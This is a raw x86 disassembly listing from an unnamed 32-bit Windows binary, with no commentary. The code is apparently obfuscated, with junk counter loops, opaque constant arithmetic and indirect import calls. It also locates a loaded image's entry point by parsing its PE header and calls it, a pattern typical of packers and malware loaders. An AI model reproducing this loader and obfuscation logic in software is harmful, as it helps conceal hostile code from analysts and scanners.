  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e72,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c56
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238ce
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423883
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423946
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c56
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421ada,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d2e,eax
  41c15b:	mov    eax,ds:0x421ada
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c56
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d2e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421ada
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c56
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c56
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c56
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cda,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421cd2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c56
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237e2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a86
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423938
  41c5ea:	push   0x42389d
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
